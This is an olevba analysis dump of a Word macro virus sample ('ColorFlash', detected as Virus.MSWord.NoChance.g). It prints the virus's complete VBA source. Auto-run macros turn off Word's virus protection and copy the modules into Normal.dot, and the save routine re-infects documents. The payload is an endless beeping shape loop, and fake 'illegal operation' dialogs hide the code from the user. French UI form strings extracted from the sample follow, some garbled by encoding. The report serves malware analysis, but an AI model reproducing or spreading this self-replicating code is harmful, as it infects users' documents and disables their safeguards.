olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ColorFlash.bas 
in file: Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575 - OLE stream: 'Macros/VBA/ColorFlash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
T$ = Mid(MyTime, 1, 2)
If D$ = "15" Then
    MsgBox "Il faut mettre un peu de couleur dans votre vie..", vbInformation, "ColorFlash Virus"
    Call PayLoad
End If
If T$ = "15" Then
    MsgBox "Le virus ColorFlash vous souhaite un Bonne Après Midi...", vbInformation, "ZeMacroKiller98"
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ColorFlash" Then
        ColorFlashInstalled = -1
    End If
Next i
If Not ColorFlashInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Private Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPL
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, "ColorFlash", _
        "Impact", 96#, msoFalse, msoFalse, 87.5, 91.3).Select
Selection.ShapeRange.IncrementLeft -8.3
Selection.ShapeRange.IncrementTop 90.3
Charge:
    ActiveDocument.Shapes.AddShape(msoShapeOval, 0#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 20#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 40#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 60#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 80#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 100#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 120#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 140#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 160#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 180#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 200#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 220#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 240#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
        ActiveDocument.Shapes.AddShape(msoShapeOval, 260#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 280#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 300#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 320#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 340#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 360#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 380#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 400#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 420#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 440#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 460#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 480#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 500#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
GoTo Charge
ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575 - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575 - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�ments
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter pas � pas
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance.g-c1adf60d4602fa44e756372dfe3ddb86c95d1575' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
